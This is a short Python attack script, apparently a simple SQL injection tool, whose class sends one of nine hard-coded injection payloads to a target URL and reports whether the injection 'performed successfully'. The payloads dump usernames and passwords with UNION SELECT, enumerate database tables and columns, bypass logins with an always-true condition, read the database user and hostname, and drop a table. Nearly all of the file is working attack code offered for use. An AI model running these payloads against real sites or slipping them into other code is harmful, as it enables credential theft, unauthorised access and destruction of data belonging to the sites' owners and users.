class PayLoad:
    def __init__(self, url):
                 self.url = "http://" + url
        
    def start_inject(self, 
                    rocket1: bool = False,
                    rocket2: bool = False,
                    rocket3: bool = False,
                    rocket4: bool = False,
                    rocket5: bool = False,
                    rocket6: bool = False,
                    rocket7: bool = False,
                    rocket8: bool = False,
                    rocket9: bool = False,
                    verbose: bool = False,
                    term: Optional[str] = None,):
            
        """missile launcher"""

        missile1 = {
            term: "' UNION SELECT username, password FROM users --"
        }

        missile2 = {
            term: "' UNION SELECT table_name, NULL FROM information_schema.tables --'"
        }

        missile3 = {
            term: "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'tablename' --"
        }

        missile4 = {
            term: "' UNION SELECT field1, field2 FROM tablename --"
        }

        missile5 = {
            term: "' OR 'a'='a",
            'pass': "' OR 'a'='a",
        }

        missile6 = {
            term: "' UNION SELECT user(), NULL --"
        }

        missile7 = {
            term: "' UNION SELECT @@hostname, NULL --"
        }

        missile8 = {
            term: "' UNION SELECT user(), NULL --"
        }

        missile9 = {
            term: "' ; DROP TABLE nome_da_tabela --"
        }

        if rocket1:
            response = requests.get(self.url, params=missile1)
            pass
        elif rocket2:
            response = requests.get(self.url, params=missile2)
            pass
        elif rocket3:
            response = requests.get(self.url, params=missile3)
            pass
        elif rocket4:
            response = requests.get(self.url, params=missile4)
            pass
        elif rocket5:
            response = requests.post(self.url, params=missile5)
            pass
        elif rocket6:
            response = requests.get(self.url, params=missile6)
            pass
        elif rocket7:
            response = requests.get(self.url, params=missile7)
            pass
        elif rocket8:
            response = requests.get(self.url, params=missile8)
            pass
        elif rocket9:
            response = requests.get(self.url, params=missile9)
            pass

        if "logout" in response.text:
            if verbose:
                print(response.text)
                print("attempt with the term -> ", term)
                pass
            print(Color.GREEN + "SQL injection performed successfully!" + Color.RESET)
   
        else:
            if verbose:
                print(response.text)
                print("attempt with the term -> ", term)
                pass
            print(Color.RED + "SQL injection didn't work." + Color.RESET)
